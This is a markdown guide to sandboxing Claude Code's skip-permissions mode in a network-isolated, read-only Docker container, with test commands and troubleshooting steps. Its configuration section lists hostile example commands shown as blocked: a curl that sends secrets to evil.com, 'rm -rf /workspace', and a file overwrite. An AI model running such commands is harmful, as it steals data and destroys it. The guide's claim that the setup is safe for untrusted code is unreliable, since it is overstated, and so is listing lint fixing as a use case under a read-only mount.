# Docker Safe YOLO Setup Guide

**Created:** 2025-10-29
**Purpose:** Secure Docker configuration for Claude Code Safe YOLO mode

---

## What is Safe YOLO Mode?

**Safe YOLO Mode** = Claude Code runs commands **without asking permission** but in a **secure isolated container**

**Use Cases:**
- Fixing lint errors (read-only analysis)
- Generating boilerplate code
- Analyzing code patterns
- Running tests automatically
- Code review suggestions

**NOT for:**
- Installing dependencies
- Modifying files (read-only mount)
- Making git commits
- Network operations
- Production deployments

---

## Security Features

### 🔒 Maximum Security Configuration

| Feature | Implementation | Risk Mitigated |
|---------|---------------|----------------|
| **Network Isolation** | `--network none` | Data exfiltration via HTTP |
| **Read-Only Filesystem** | `-v project:ro` | File modification |
| **Resource Limits** | `--cpus=2.0 --memory=4g` | Resource exhaustion |
| **No Privileges** | `--security-opt=no-new-privileges` | Privilege escalation |
| **Temporary FS** | `--tmpfs /tmp:noexec` | Malicious code execution |
| **Container Isolation** | Standard Docker | Container escape |

**Overall Risk Level:** ⚠️ **LOW** (suitable for untrusted code execution)

---

## Quick Start

### Option 1: Using the Script (Recommended)

```bash
# Make sure you're in project root
cd /Users/simonroy/Desktop/bridge_bidding_app

# Run the secure script
./.claude/docker-safe-yolo.sh "Fix all lint errors in backend/"
```

**What it does:**
1. ✅ Checks Docker is running
2. ✅ Pulls image if needed
3. ✅ Asks for confirmation
4. ✅ Runs in isolated container
5. ✅ Removes container when done
6. ✅ Shows results

### Option 2: Manual Docker Command

```bash
docker run \
  --name claude-code-safe-yolo \
  --rm \
  --interactive \
  --tty \
  --network none \
  --cpus="2.0" \
  --memory="4g" \
  --security-opt=no-new-privileges \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=1g \
  -v "$(pwd):/workspace:ro" \
  -w /workspace \
  anthropics/claude-code:latest \
  claude --dangerously-skip-permissions -p "Fix lint errors"
```

---

## Setup Steps

### Step 1: Verify Docker is Running

```bash
docker info
```

**Expected:** Docker daemon information displays

**If error:** Start Docker Desktop

---

### Step 2: Pull Claude Code Image (First Time)

```bash
# Pull the official image
docker pull anthropics/claude-code:latest

# Verify it downloaded
docker images | grep claude-code
```

**Expected:**
```
anthropics/claude-code   latest   abc123def456   2 days ago   1.2GB
```

**Note:** This may take 5-10 minutes on first run (large image)

---

### Step 3: Test the Setup

```bash
# Run a simple test
./.claude/docker-safe-yolo.sh "List all Python files in backend/"
```

**Expected:**
- Security configuration displayed
- Confirmation prompt
- Claude executes and shows output
- Container removed automatically

---

## Verifying VS Code Docker Extension

### Option 1: Visual Check

1. Open VS Code
2. Press `Cmd+Shift+X` (Extensions)
3. Search for "Docker"
4. Look for: **Docker** by Microsoft
   - ID: `ms-azuretools.vscode-docker`
   - Status: Should show "Installed"

### Option 2: Command Line Check

```bash
# List installed VS Code extensions
code --list-extensions | grep docker

# Or full path on macOS
/Applications/Visual\ Studio\ Code.app/Contents/Resources/app/bin/code \
  --list-extensions | grep docker
```

**Expected:** `ms-azuretools.vscode-docker`

### Option 3: Install if Missing

**Via VS Code:**
1. Press `Cmd+Shift+X`
2. Search "Docker"
3. Click "Install" on Docker by Microsoft

**Via Command Line:**
```bash
code --install-extension ms-azuretools.vscode-docker
```

**Via Settings Sync:**
- If you use Settings Sync, extensions sync automatically

---

## Test Container with Secure Settings

### Test 1: Verify Network Isolation

```bash
# Test that container has NO internet access
docker run \
  --rm \
  --network none \
  alpine:latest \
  ping -c 1 8.8.8.8

# Expected: "bad address '8.8.8.8'" or "Network is unreachable"
# This proves internet is blocked ✅
```

### Test 2: Verify Read-Only Filesystem

```bash
# Test that files cannot be modified
docker run \
  --rm \
  --network none \
  -v "$(pwd):/workspace:ro" \
  -w /workspace \
  alpine:latest \
  touch /workspace/test.txt

# Expected: "Read-only file system" error ✅
```

### Test 3: Verify Resource Limits

```bash
# Test CPU and memory limits
docker run \
  --rm \
  --cpus="0.5" \
  --memory="512m" \
  --network none \
  alpine:latest \
  sh -c "cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us"

# Expected: Shows CPU quota (not unlimited) ✅
```

### Test 4: Full Secure Configuration Test

```bash
# Run full security test
docker run \
  --name security-test \
  --rm \
  --network none \
  --cpus="1.0" \
  --memory="1g" \
  --security-opt=no-new-privileges \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=100m \
  -v "$(pwd):/workspace:ro" \
  alpine:latest \
  sh -c "
    echo '=== Security Test ==='
    echo 'Network: Testing...'
    ping -c 1 8.8.8.8 2>&1 | grep -q 'bad address' && echo '✓ Network isolated' || echo '✗ Network NOT isolated'
    echo 'Filesystem: Testing...'
    touch /workspace/test 2>&1 | grep -q 'Read-only' && echo '✓ Filesystem read-only' || echo '✗ Filesystem writable'
    echo 'Temp: Testing...'
    touch /tmp/test && rm /tmp/test && echo '✓ Temp filesystem works' || echo '✗ Temp filesystem failed'
    echo 'Privileges: Testing...'
    cat /proc/1/status | grep NoNewPrivs | grep -q 1 && echo '✓ No new privileges' || echo '✗ Privileges enabled'
    echo 'Complete!'
  "
```

**Expected Output:**
```
=== Security Test ===
Network: Testing...
✓ Network isolated
Filesystem: Testing...
✓ Filesystem read-only
Temp: Testing...
✓ Temp filesystem works
Privileges: Testing...
✓ No new privileges
Complete!
```

---

## Usage Examples

### Example 1: Fix Lint Errors

```bash
./.claude/docker-safe-yolo.sh "Fix all lint errors in backend/ and show me what would be fixed"
```

**Result:** Claude analyzes code and suggests fixes (read-only, safe)

### Example 2: Generate Boilerplate

```bash
./.claude/docker-safe-yolo.sh "Generate a REST API endpoint template for user authentication"
```

**Result:** Claude generates code template (outputs to stdout)

### Example 3: Code Review

```bash
./.claude/docker-safe-yolo.sh "Review backend/engine/bidding_engine.py for code quality issues"
```

**Result:** Claude provides code review suggestions

### Example 4: Run Tests

```bash
./.claude/docker-safe-yolo.sh "Run pytest on backend/tests/unit/ and show me the results"
```

**Result:** Claude runs tests and shows output

---

## Troubleshooting

### Issue: "Cannot connect to Docker daemon"

**Solution:**
```bash
# Start Docker Desktop
open -a Docker

# Wait 30 seconds for it to start
sleep 30

# Verify it's running
docker info
```

### Issue: "Image not found"

**Solution:**
```bash
# Pull the image manually
docker pull anthropics/claude-code:latest

# Or let the script pull it automatically
./.claude/docker-safe-yolo.sh "test"
```

### Issue: "Permission denied: .claude/docker-safe-yolo.sh"

**Solution:**
```bash
# Make script executable
chmod +x .claude/docker-safe-yolo.sh

# Verify
ls -l .claude/docker-safe-yolo.sh
```

### Issue: "Container name already in use"

**Solution:**
```bash
# Remove old container
docker rm -f claude-code-safe-yolo

# Or the script does this automatically
```

### Issue: Script runs but no output

**Check:**
- Is Docker running? `docker info`
- Is image downloaded? `docker images | grep claude-code`
- Are you in project root? `pwd`
- Does task make sense? Try simpler task first

---

## Understanding the Configuration

### Network: `--network none`

**What it does:** Completely isolates container from all networks

**Why:** Prevents data exfiltration via HTTP/HTTPS/DNS

**Trade-off:** Cannot fetch URLs, make API calls, or access internet

**Example blocked:**
```bash
curl https://evil.com/exfiltrate?data=secrets  # BLOCKED ✅
```

### Filesystem: `-v $(pwd):/workspace:ro`

**What it does:** Mounts project as read-only

**Why:** Prevents file modification, data loss, malicious changes

**Trade-off:** Cannot write files, install packages, or modify code

**Example blocked:**
```bash
rm -rf /workspace  # BLOCKED ✅
echo "malicious" > /workspace/file.py  # BLOCKED ✅
```

### Resources: `--cpus="2.0" --memory="4g"`

**What it does:** Limits CPU to 2 cores, RAM to 4GB

**Why:** Prevents resource exhaustion, system slowdown

**Trade-off:** May run slower on large tasks

**Example mitigated:**
```python
# Infinite loop won't freeze your system
while True:
    pass  # Uses max 2 CPUs ✅
```

### Security: `--security-opt=no-new-privileges`

**What it does:** Prevents privilege escalation

**Why:** Container can't gain root access or escape

**Trade-off:** None (should always use)

### Temporary FS: `--tmpfs /tmp:rw,noexec,nosuid`

**What it does:** Writeable /tmp but no executable permissions

**Why:** Can write temporary files but can't execute malicious code

**Trade-off:** None (best practice)

---

## Security Comparison

### Without Docker (Normal Mode)

| Aspect | Status | Risk |
|--------|--------|------|
| Network Access | ✅ Full | High (data exfiltration) |
| File System | ✅ Full | High (data loss) |
| Resources | ✅ Unlimited | Medium (system slowdown) |
| Isolation | ❌ None | High (full system access) |

### With Docker (Safe YOLO Mode)

| Aspect | Status | Risk |
|--------|--------|------|
| Network Access | ❌ None | ✅ Low (blocked) |
| File System | ❌ Read-only | ✅ Low (protected) |
| Resources | ⚠️ Limited | ✅ Low (2 CPU, 4GB) |
| Isolation | ✅ Full | ✅ Low (containerized) |

---

## When to Use Safe YOLO Mode

### ✅ Good Use Cases

- **Lint fixing** - Read-only analysis and suggestions
- **Code generation** - Templates and boilerplate (stdout)
- **Code review** - Analysis and recommendations
- **Test running** - Execute tests, view results
- **Pattern analysis** - Search and identify patterns
- **Documentation** - Generate docs from code

### ❌ Not Suitable For

- **Installing packages** - No network, read-only filesystem
- **Making git commits** - Read-only filesystem
- **Modifying files** - Read-only filesystem
- **Deploying** - No network access
- **Database migrations** - Need write access
- **Building projects** - Need write access for build artifacts

---

## Files Created

1. **`.claude/docker-safe-yolo.sh`** (executable script)
   - Main entry point
   - Security checks
   - User-friendly prompts
   - Automatic cleanup

2. **`.claude/docker-safe-yolo.json`** (configuration)
   - Docker settings
   - Security features
   - Risk assessment
   - Usage guidelines

3. **`.claude/DOCKER_SETUP_GUIDE.md`** (this file)
   - Complete documentation
   - Setup instructions
   - Usage examples
   - Troubleshooting

---

## Next Steps

1. ✅ **Verify Docker is running:** `docker info`
2. ✅ **Test the setup:** `./.claude/docker-safe-yolo.sh "echo Hello"`
3. ✅ **Verify VS Code extension:** Open VS Code → Extensions → Search "Docker"
4. ✅ **Run security tests:** See "Test Container with Secure Settings" section
5. 📝 **Try a real task:** Use for lint fixing or code review
6. 📝 **Read limitations:** Understand what Safe YOLO can and cannot do

---

## Support

**Questions?**
- Read this guide thoroughly
- Check troubleshooting section
- Review security features
- Test with simple tasks first

**Need help?**
- Verify Docker is running
- Check image is downloaded
- Ensure script is executable
- Try manual docker command

---

**Remember:** Safe YOLO mode is for **read-only** tasks in an **isolated environment**. It's secure but limited. For tasks requiring file modifications, use normal Claude Code mode with supervision.
